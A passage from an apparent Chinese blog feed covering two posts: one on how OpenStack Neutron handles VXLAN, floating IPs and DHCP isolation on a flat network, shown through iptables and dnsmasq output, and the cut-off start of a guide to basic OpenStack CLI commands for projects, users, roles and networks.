src="https://image.boychai.xyz/img/Pasted%20image%2020250217193639.png"><br>控制节点的ip即当前vxlan网络的网关<code>10.10.10.1</code>mac地址是<code>fa:16:3e:3d:18:d0</code>，实例的ip是<code>10.10.10.133</code>mac地址是<code>fa:16:3e:68:60:74</code>，在对方节点学习到的arp也是如此，当发包的时候这些信息也都会存储在数据包中(<code>不仅仅是当前网络所有的网络都是这样的具体参考计算机网络学科</code>)，vxlan设备会拿到这些信息去查询<code>FDB</code>表，例如在计算点<code>fa:16:3e:3d:18:d0</code>这个mac地址对应的ip是<code>172.16.0.11</code>那么vxlan设备就会在这个数据包的基础上套一层<code>源地址</code>、<code>目的地址</code>、<code>VNI</code>标识等其他信息，这里不细说封装，源地址即<code>linuxbridge_agent</code>配置中的<code>local_ip</code>即<code>172.16.0.31</code>，对应的也会从这个地址的网卡发包，目的地址就是刚才查询到的<code>FDB</code>的地址，即<code>172.16.0.11</code>，然后<code>VNI</code>标识是用来区分网络的，因为所有的数据包都去走这个vxlan的udp端口，具体区分网络的方式就是通过这个<code>VNI</code>标识，封装好相关数据之后会发给对端，具体的对端端口可以通过下面命令获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip -d <span class="built_in">link</span> show vxlan-1</span><br><span class="line">8: vxlan-1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue master brq7f850748-2d state UNKNOWN mode DEFAULT</span><br><span class="line">group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:b6:1f:77:c4:1b brd ff:ff:ff:ff:ff:ff promiscuity 1</span><br><span class="line">    vxlan <span class="built_in">id</span> 1 dev ens37 srcport 0 0 dstport 8472 ageing 300 noudpcsum noudp6zerocsumtx noudp6zerocsumrx</span><br><span class="line">    bridge_slave state forwarding priority 32 cost 100 hairpin off guard off root_block off fastleave off learning on</span><br><span class="line">flood on port_id 0x8001 port_no 0x1 designated_port 32769 designated_cost 0 designated_bridge 8000.a:b6:1f:77:c4:1b designated_root 8000.a:b6:1f:77:c4:1b hold_timer    0.00 message_age_timer    0.00 forward_delay_timer    0.00 topology_change_ack 0 config_pending 0 proxy_arp off proxy_arp_wifi off mcast_router 1 mcast_fast_leave off mcast_flood on addrgenmode eui64 numtxqueues 1 numrxqueues 1 gso_max_size 65536 gso_max_segs 65535</span><br><span class="line">[root@controller ~]# ss -unl|grep 8472</span><br><span class="line">UNCONN     0      0            *:8472                     *:*</span><br></pre></td></tr></table></figure><p>所有有vxlan设备的主机应该都是差不多的，vxlan的标准端口是<code>4789</code>，他这里指定的是<code>8472</code>，这个端口好像是思科的标准，这里的端口是内核负责监听的，所以这里你是不可以通过进程的形式找到他的监听程序的，他拿到数据就会丢到相应的<code>VXLAN</code>设备中这个设备会把这个包的最外层也就是上一个<code>VXLAN</code>设备给封装的相关内容剔除然后进行转发原本的地址，这样就实现了通信。<br>再说一下浮动IP，这里我创建一个浮动IP给当前实例绑定上，如下图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217202736.png"><br>绑定之后发现计算节点的网络信息并没有该边而是在计算节在<code>qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3</code>命名空间中的出网接口增加了一个IP，配置如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 ip a</span><br><span class="line">2: qg-f00694f6-24@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:6a:e4:80 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.0.0.208/24 brd 10.0.0.255 scope global qg-f00694f6-24</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 10.0.0.210/32 brd 10.0.0.210 scope global qg-f00694f6-24</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe6a:e480/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: qr-31b0feaa-20@if15: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1450 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:3d:18:d0 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.10.10.1/24 brd 10.10.10.255 scope global qr-31b0feaa-20</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe3d:18d0/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>对应的路由转发相关的规则会在iptables体现，具体参考下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qrouter-e651f481-55aa-46a7-aa62-96ef71e5bac3 iptables -t nat -L -n -v|grep 210</span><br><span class="line">    0     0 DNAT       all  --  *      *       0.0.0.0/0            10.0.0.210           to:10.10.10.133</span><br><span class="line">    0     0 DNAT       all  --  *      *       0.0.0.0/0            10.0.0.210           to:10.10.10.133</span><br><span class="line">    0     0 SNAT       all  --  *      *       10.10.10.133         0.0.0.0/0            to:10.0.0.210</span><br></pre></td></tr></table></figure><p>当前网络的结构关系如下图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217211239.png"></p><h1 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h1><p>在研究openstack网络<code>Neutron</code>组件的过程中，心里好多疑问，我把它总结到这里，问题以及验证。</p><h2 id="在FLAT网络中内部和外部的DHCP为什么可以做到互不干预？"><a href="#在FLAT网络中内部和外部的DHCP为什么可以做到互不干预？" class="headerlink" title="在FLAT网络中内部和外部的DHCP为什么可以做到互不干预？"></a>在FLAT网络中内部和外部的DHCP为什么可以做到互不干预？</h2><p>这个问题其实并不严谨，我当时是上面<code>供应商-Provider网络</code>的结构，我外部是采用VMware的NAT网络，我给开了一个内部DHCP，配置如图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250216180004.png"><br>然而我FLAT的子网中也配置了一个<code>DHCP-Agent</code>,如下图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250216180129.png"><br>我发现它们两个DHCP互不干预，当子网的DHCP关闭，对应子网内的实例是无法通过外部DHCP获取IP的，然后外部的DHCP关掉，内部的打开，外部的对应网络下的虚机也是无法通过内部DHCP获取到IP的。各种文档解释<code>FLAT</code>网络都是相当于直连，但是为什么当前的的环境下DHCP不互通？而且我内部甚至可以使用外部的网关进行上网？我查了好多文章都没发现有人说这个的，我就进入虚机自己分析了，我最开始怀疑他做了内部隔离，就是两个广播域，他通过软件的方式去做映射，我通过把内部子网DHCP关掉，这样内部的实例就会去播报arp宣告，我发现不管是那台主机去抓包都会拿到他广播的数据包，并且外部的DHCP是回复了他的数据包的，这就很奇怪，如下图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250216191338.png"><br>首先是第一个红框的内容，实例发送了DHCP广播<code>Discover</code>包，然而<code>10.0.0.254</code>明明给他了一个ip<code>10.0.0.254</code>但是后续就没了，按照正常顺序他应该回复一个<code>DHCP Request</code>的一个确认数据包，但是他这里没后续，并且继续去广播<code>Discover</code>包，而且他依旧回复了，给他了一个<code>10.0.0.161</code>，中途外部的DHCP一直广播ARP谁是这个他分配的这个<code>ip</code>一直也没有得到回复，后续一直再重复这个过程，这里可以判断出它们确实都在一个广播域中，只是客户端一直没去使用外部DHCP，在openstack网络结构中这一层的网桥(我这里叫做第二层网桥)，如图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250216192205.png"><br>他有一个数据包过滤的作用，这里去计算节点中查看iptables过滤规则，发现了端倪，规则如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# iptables-save | grep -E <span class="string">&#x27;67|68&#x27;</span></span><br><span class="line">:INPUT ACCEPT [127064:177468678]</span><br><span class="line">-A neutron-linuxbri-i76c0c08c-7 -d 10.0.0.206/32 -p udp -m udp --sport 67 --dport 68 -j RETURN</span><br><span class="line">-A neutron-linuxbri-i76c0c08c-7 -d 255.255.255.255/32 -p udp -m udp --sport 67 --dport 68 -j RETURN</span><br><span class="line">-A neutron-linuxbri-o76c0c08c-7 -s 0.0.0.0/32 -d 255.255.255.255/32 -p udp -m udp --sport 68 --dport 67 -m comment --comment <span class="string">&quot;Allow DHCP client traffic.&quot;</span> -j RETURN</span><br><span class="line">-A neutron-linuxbri-o76c0c08c-7 -p udp -m udp --sport 68 --dport 67 -m comment --comment <span class="string">&quot;Allow DHCP client traffic.&quot;</span></span><br><span class="line">-j RETURN</span><br><span class="line">-A neutron-linuxbri-o76c0c08c-7 -p udp -m udp --sport 67 --dport 68 -m comment --comment <span class="string">&quot;Prevent DHCP Spoofing by VM.&quot;</span> -j DROP</span><br></pre></td></tr></table></figure><p>比较重要的是这两条规则，第一条规则如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-linuxbri-i76c0c08c-7 -d 10.0.0.206/32 -p udp -m udp --sport 67 --dport 68 -j RETURN</span><br></pre></td></tr></table></figure><p>第一条规则是当DHCP分配的地址是<code>10.0.0.206</code>的话则把这条丢到原链上的，即原本的<code>INPUT</code>、<code>OUTPUT</code>中只要是放行的则这条就是通过，去看了看原链上的规则就是<code>ACCEPT</code>,规则如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# iptables -L</span><br><span class="line">Chain INPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination</span><br><span class="line">neutron-linuxbri-INPUT  all  --  anywhere             anywhere</span><br><span class="line"></span><br><span class="line">Chain FORWARD (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination</span><br><span class="line">neutron-filter-top  all  --  anywhere             anywhere</span><br><span class="line">neutron-linuxbri-FORWARD  all  --  anywhere             anywhere</span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">target     prot opt <span class="built_in">source</span>               destination</span><br><span class="line">neutron-filter-top  all  --  anywhere             anywhere</span><br><span class="line">neutron-linuxbri-OUTPUT  all  --  anywhere             anywhere</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>那就是说他这个实例允许收到这个ip的DHCP回包。再去看第二条，规则如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A neutron-linuxbri-o76c0c08c-7 -p udp -m udp --sport 67 --dport 68 -m comment --comment <span class="string">&quot;Prevent DHCP Spoofing by VM.&quot;</span> -j DROP</span><br></pre></td></tr></table></figure><p>iptables的规则是从上到下去匹配的，如果不符合上面<code>206</code>的规则那么这条将会丢弃所有DHCP的<code>Offer</code>包，就导致不管子网内的主机有没有配置DHCP，都没办法使用外部的DHCP。好，现在第一个疑问解决了，再看第二个为什么内部DHCP开启没办法给外部主机分配DHCP，我直接把VMware的DHCP关掉，关掉之后开一台这个网络的虚机，让他去通过DHCP获取IP，然后我在控制节点对应QDHCP的命名空间中去抓QDHCP的网卡，当外部主机区获取IP的时候抓到了下面的数据，如图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250216195031.png"><br>发现他一直在发包DHCP的<code>Discover</code>包，一直在广播域中去找DHCP拿ip，但是<code>QDHCP</code>并没有回应他，到这里我就已经明白了，<code>Neutron</code>他自己维护的DHCP只会对集群自己的管理的实例进行服务，实现的方式估计也是通过MAC地址实现过滤，当符合他ip的MAC则就分配这个ip，如果不符合那么就不作为，具体可以参考他QDHCP实现软件的相关配置，我默认配置的DHCP-Agent实现方式如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/neutron/dhcp_agent.ini</span><br><span class="line">[DEFAULT]</span><br><span class="line">interface_driver = linuxbridge</span><br><span class="line">dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq</span><br><span class="line">enable_isolated_metadata = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>他的实现是采用<code>Dnsmasq</code>软件，我们去看一下他的启动参数，通过下面的命令拿到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 ps aux |grep dnsmasq</span><br><span class="line">nobody     7584  0.0  0.0  56128  1068 ?        S    17:22   0:00 dnsmasq --no-hosts --no-resolv --pid-file=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/pid --dhcp-hostsfile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/host --addn-hosts=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/addn_hosts --dhcp-optsfile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/opts --dhcp-leasefile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/leases --dhcp-match=<span class="built_in">set</span>:ipxe,175 --dhcp-userclass=<span class="built_in">set</span>:ipxe6,iPXE --local-service --bind-dynamic --dhcp-range=<span class="built_in">set</span>:subnet-69611b38-36b5-4e98-b47e-949c2137dbe1,10.0.0.0,static,255.255.255.0,86400s --dhcp-option-force=option:mtu,1500 --dhcp-lease-max=256 --conf-file= --domain=openstacklocal</span><br></pre></td></tr></table></figure><p>具体的这些参数可以自己GPT，我这里说一下软件是怎么实现的这个功能，他的行参中有一项<code>--dhcp-hostsfile=/var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/host</code>，这个参数的作用是加载一个 预定义的 MAC-IP 映射文件，仅响应文件中列出的 MAC 地址的 DHCP 请求。这个文件是由<code>neutron</code>去管理，内容可以查看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /var/lib/neutron/dhcp/dd604587-3542-409b-9ca8-eed06840fb55/host</span><br><span class="line">fa:16:3e:4d:6a:b1,host-10-0-0-206.openstacklocal,10.0.0.206</span><br><span class="line">fa:16:3e:cb:5e:78,host-10-0-0-200.openstacklocal,10.0.0.200</span><br></pre></td></tr></table></figure><p>这里就存着他自己和我的实例的对应表。到这里这个问题就清晰了，互不干预的原因是因为它内部有过滤规则和相应条件，内部只会把内部的DHCP包交给实例，否则会过滤掉，并且内部的DHCP不会去响应外部机器的<code>Discover</code>包。</p><h2 id="两层网桥网桥和OpenStack中的概念对应关系"><a href="#两层网桥网桥和OpenStack中的概念对应关系" class="headerlink" title="两层网桥网桥和OpenStack中的概念对应关系"></a>两层网桥网桥和OpenStack中的概念对应关系</h2><p>具体参考下图，具体的实验可以通过在同网络下一个子网一个实例，一个一个去增加实例和子网网络等操作，去节点中查看他们的网络ip网卡网桥对应表。<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217211208.png"></p><h2 id="除了VXLAN的实现还有其他的吗？"><a href="#除了VXLAN的实现还有其他的吗？" class="headerlink" title="除了VXLAN的实现还有其他的吗？"></a>除了VXLAN的实现还有其他的吗？</h2><p>有的兄弟，有的，VLAN、VXLAN、GRE、Flat、Geneve、Local，如图<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250217211517.png"><br>它们的区别这里大体讲一下</p><ul><li>VLAN 我记得VLAN是有数量限制的，应该是4096个，如果采用VLAN的形式还需要在对应的网络设备接口中打<code>Trunk</code>需要配合。</li><li>VXLAN 它支持16M的网络数量，可以说是基本用不完，还可以跨数据中心，他就有一点缺点，他需要多一层数据封包，多了额外的计算资源的开销。</li><li>GRE 这是个隧道协议，它可以跨多个物理网络，并且支持协议也多灵活度也高，但是他不提供数据加密，通常需要配合<code>IPsec</code>，还有就是带宽和性能受到隧道负载的影响。</li><li>Flat 不多说了 就是直连网络，而且没有网络隔离。</li><li>Geneve 这个比VXLAN更加优秀，但是他比较新，还没有普及。</li><li>Local 虚机想要通信必须在同一个主机并且同一个Local网络中，条件苛刻，但是比较安全。</li></ul><p>要注意的是，在配置这些网络的时候请在配置中设置支持，配置参考<code>/etc/neutron/plugins/ml2/ml2_conf.ini</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type_drivers = flat,vlan,vxlan</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言
基于组件理解文章，这里单独做一个对于openstack网络组件Neutron的理解，本文只是我自己对于它的理解，因为网上的资料比较有限，本文只能代表我个人理解，有不对的地方欢迎大佬指正。我的环境是Linux Bridge + VXLAN的形式，具体的配置体现可以参考搭建文章的下面内容

官方文档-1： https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html
官方文档-2： https://docs.openstack.org/neutron/stein/install/controller-</summary>
    
    
    
    <category term="虚拟化平台" scheme="https://blog.boychai.xyz/categories/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0/"/>
    
    
    <category term="开源工具" scheme="https://blog.boychai.xyz/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
    <category term="OpenStack" scheme="https://blog.boychai.xyz/tags/OpenStack/"/>
    
    <category term="Provider" scheme="https://blog.boychai.xyz/tags/Provider/"/>
    
    <category term="VXLAN" scheme="https://blog.boychai.xyz/tags/VXLAN/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack-命令控制</title>
    <link href="https://blog.boychai.xyz/2025/02/07/OpenStack-%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/"/>
    <id>https://blog.boychai.xyz/2025/02/07/OpenStack-%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/</id>
    <published>2025-02-07T14:26:00.000Z</published>
    <updated>2025-07-17T05:40:18.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> OS_USERNAME=admin</span><br><span class="line"><span class="built_in">export</span> OS_PASSWORD=ADMIN_PASS</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=admin</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_AUTH_URL=http://controller:5000/v3</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br></pre></td></tr></table></figure><h1 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h1><h2 id="帮助信息"><a href="#帮助信息" class="headerlink" title="帮助信息"></a>帮助信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack project -h</span><br><span class="line">Command <span class="string">&quot;project&quot;</span> matches:</span><br><span class="line">  project create</span><br><span class="line">  project delete</span><br><span class="line">  project list</span><br><span class="line">  project purge</span><br><span class="line">  project <span class="built_in">set</span></span><br><span class="line">  project show</span><br></pre></td></tr></table></figure><h2 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h2><p>执行<code>openstack project create cec</code>命令创建一个名为cec的项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack project create cec</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description |                                  |</span><br><span class="line">| domain_id   | default                          |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| <span class="built_in">id</span>          | d4bc3306513e4ad29a909a48a2d99050 |</span><br><span class="line">| is_domain   | False                            |</span><br><span class="line">| name        | cec                              |</span><br><span class="line">| parent_id   | default                          |</span><br><span class="line">| tags        | []                               |</span><br><span class="line">+-------------+----------------------------------+</span><br></pre></td></tr></table></figure><h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><h2 id="帮助信息-1"><a href="#帮助信息-1" class="headerlink" title="帮助信息"></a>帮助信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack user -h</span><br><span class="line">Command <span class="string">&quot;user&quot;</span> matches:</span><br><span class="line">  user create</span><br><span class="line">  user delete</span><br><span class="line">  user list</span><br><span class="line">  user password <span class="built_in">set</span></span><br><span class="line">  user <span class="built_in">set</span></span><br><span class="line">  user show</span><br></pre></td></tr></table></figure><h2 id="用户创建"><a href="#用户创建" class="headerlink" title="用户创建"></a>用户创建</h2><p>执行<code>openstack user create --domain default --password openstack2025 zhangsan</code>命令创建一个名字为<code>zhangsan</code>密码为<code>openstack2025</code>的用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack user create --domain default --password openstack2025 zhangsan</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | default                          |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| <span class="built_in">id</span>                  | fdb63599689244748bc10f696cef95ef |</span><br><span class="line">| name                | zhangsan                         |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br></pre></td></tr></table></figure><h1 id="角色管理"><a href="#角色管理" class="headerlink" title="角色管理"></a>角色管理</h1><h2 id="帮助信息-2"><a href="#帮助信息-2" class="headerlink" title="帮助信息"></a>帮助信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack role -h</span><br><span class="line">Command &quot;role&quot; matches:</span><br><span class="line">  role add</span><br><span class="line">  role assignment list</span><br><span class="line">  role create</span><br><span class="line">  role delete</span><br><span class="line">  role list</span><br><span class="line">  role remove</span><br><span class="line">  role set</span><br><span class="line">  role show</span><br></pre></td></tr></table></figure><h2 id="列出所有角色"><a href="#列出所有角色" class="headerlink" title="列出所有角色"></a>列出所有角色</h2><p>执行<code>openstack role list</code>命令查看所有角色</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack role list</span><br><span class="line">+----------------------------------+--------+</span><br><span class="line">| ID                               | Name   |</span><br><span class="line">+----------------------------------+--------+</span><br><span class="line">| 5daaa049f2074497b015fc8e47bbe847 | reader |</span><br><span class="line">| 654636054f124ade812e3aac84059880 | user   |</span><br><span class="line">| 9feed25c0a2a4fcaae9eefd1d1ec872e | member |</span><br><span class="line">| e55c05c671b445c6bab35dfaf337433d | admin  |</span><br><span class="line">+----------------------------------+--------+</span><br></pre></td></tr></table></figure><h2 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h2><p>执行<code>openstack role add --project cec --user zhangsan admin</code>命令，把用户<code>zhangsan</code>划分到<code>cec</code>项目中并且给予<code>admin</code>权限。这条命令正常是无回显的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack role add --project cec --user zhangsan admin</span><br></pre></td></tr></table></figure><h1 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h1><h2 id="帮助信息-3"><a href="#帮助信息-3" class="headerlink" title="帮助信息"></a>帮助信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack network -h</span><br><span class="line">Command <span class="string">&quot;network&quot;</span> matches:</span><br><span class="line">  network agent add network</span><br><span class="line">  network agent add router</span><br><span class="line">  network agent delete</span><br><span class="line">  network agent list</span><br><span class="line">  network agent remove network</span><br><span class="line">  network agent remove router</span><br><span class="line">  network agent <span class="built_in">set</span></span><br><span class="line">  network agent show</span><br><span class="line">  network auto allocated topology create</span><br><span class="line">  network auto allocated topology delete</span><br><span class="line">  network create</span><br><span class="line">  network delete</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这个有很多,不说细写,用到的时候再去学习也不是很晚。</p><h2 id="列出网络"><a href="#列出网络" class="headerlink" title="列出网络"></a>列出网络</h2><p>通过命令<code>openstack network list</code>列出网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# openstack network list</span><br><span class="line">+--------------------------------------+------------+--------------------------------------+</span><br><span class="line">| ID                                   | Name       | Subnets                              |</span><br><span class="line">+--------------------------------------+------------+--------------------------------------+</span><br><span class="line">| 0a89e120-408a-4495-a6b5-6bae36b45087 | test1      | 42a42a5c-7c7f-42b6-8335-0bd4ff9c5b7a |</span><br><span class="line">| 5b0ca4e2-9cb7-40ff-8126-8f6871366ea8 | net_vmnet1 | acefb75a-c3e4-41f8-b411-756ca7145099 |</span><br><span class="line">| dd604587-3542-409b-9ca8-eed06840fb55 | provider   | 69611b38-36b5-4e98-b47e-949c2137dbe1 |</span><br><span class="line">+--------------------------------------+------------+--------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="详细信息"><a href="#详细信息" class="headerlink" title="详细信息"></a>详细信息</h2><p>通过命令<code>openstack network show &#123;网络名称&#125;</code>即可列出他的详细信息<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250207114122.png"></p><h2 id="创建网络"><a href="#创建网络" class="headerlink" title="创建网络"></a>创建网络</h2><p>通过命令<code>openstack network create --share --external --provider-network-type flat public --provider-physical-network provider</code> 来创建flat一个网络，参数具体含义如下</p><ul><li>–share 共享的</li><li>–external 外部的</li><li>–provider-network-type flat 指定网络类型为flat</li><li>public 网络名称</li><li>–provider-physical-network provider 